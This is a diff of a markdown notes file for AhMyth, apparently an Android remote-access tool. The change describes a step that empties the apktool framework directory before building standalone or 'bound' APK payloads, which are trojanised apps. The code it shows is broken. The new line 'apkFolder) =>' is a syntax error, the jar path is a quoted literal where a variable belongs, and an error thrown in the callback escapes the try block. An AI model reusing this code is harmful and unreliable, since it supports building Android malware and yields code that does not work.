@@ -1,33 +1,16 @@
-# Empty the Framework Dir
+# Function to Empty the Apktool Framework Directory
 This Code will reduce building failed errors with both Standalone APK payloads and Bound APK Payloads, it empties the apktool framework directory before building any payload everytime
 ```js
 
 try {
-
     exec('java -jar ' + '" CONSTANTS.apktoolJar "' + ' empty-framework-dir', (error, stderr, stdout) => {
-
         if (error) {
-
-    	       throw error;
-
- 	   	       return; 	    
-
-        }
-
- 	
-
-    	});
-
- 	
-
+           throw error;
+           return; 	    
+        }    
+    });
 } catch (error) {
-
-	
-
-	// Building function here
-
-	
-
+    // Building function here
 }
 
 ```
@@ -39,7 +22,7 @@ This one was a bit of a pain to manage, but it was done in the end, this future 
 This new function also fixes a bug that was recently discovered when running AhMyth on Windows machines.
 
 ```js  
-    $appCtrl.BindOnLauncher = (apkFolder) => {
+    $appCtrl.BindOnLauncher = apkFolder) => {
 
 
     $appCtrl.Log('Finding Launcher Activity From AndroidManifest.xml...');
